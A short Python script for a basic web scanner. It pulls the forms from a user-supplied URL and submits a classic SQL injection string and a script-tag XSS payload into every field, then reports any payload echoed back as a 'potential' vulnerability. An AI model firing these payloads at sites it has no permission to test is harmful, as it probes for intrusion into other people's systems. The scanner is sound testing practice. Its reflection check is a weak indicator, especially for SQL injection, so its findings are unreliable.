import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# SQLi and XSS payloads
sqli_payload = "' OR '1'='1"
xss_payload = "<script>alert('XSS')</script>"

def get_forms(url):
    try:
        res = requests.get(url)
        soup = BeautifulSoup(res.content, "html.parser")
        return soup.find_all("form")
    except Exception as e:
        print(f"[!] Error accessing {url}: {e}")
        return []

def get_form_details(form):
    details = {
        "action": form.attrs.get("action"),
        "method": form.attrs.get("method", "get").lower(),
        "inputs": []
    }
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        details["inputs"].append({"type": input_type, "name": input_name})
    return details

def submit_form(form_details, url, payload):
    target_url = urljoin(url, form_details["action"])
    data = {}
    for input_field in form_details["inputs"]:
        if input_field["type"] != "submit" and input_field["name"]:
            data[input_field["name"]] = payload
    try:
        if form_details["method"] == "post":
            return requests.post(target_url, data=data)
        else:
            return requests.get(target_url, params=data)
    except Exception as e:
        print(f"[!] Request error: {e}")
        return None

def scan_xss_sqli(url):
    forms = get_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}")
    for i, form in enumerate(forms):
        form_details = get_form_details(form)
        print(f"[*] Testing form #{i+1} at {form_details['action']}")

        for payload, label in [(sqli_payload, "SQL Injection"), (xss_payload, "XSS")]:
            print(f"    [+] Testing for {label}...")
            response = submit_form(form_details, url, payload)
            if response and payload in response.text:
                print(f"    [!] Potential {label} vulnerability detected in form #{i+1}!")
            else:
                print(f"    [-] No {label} vulnerability detected.")

if __name__ == "__main__":
    target = input("Enter the URL to scan (e.g., http://testphp.vulnweb.com): ").strip()
    scan_xss_sqli(target)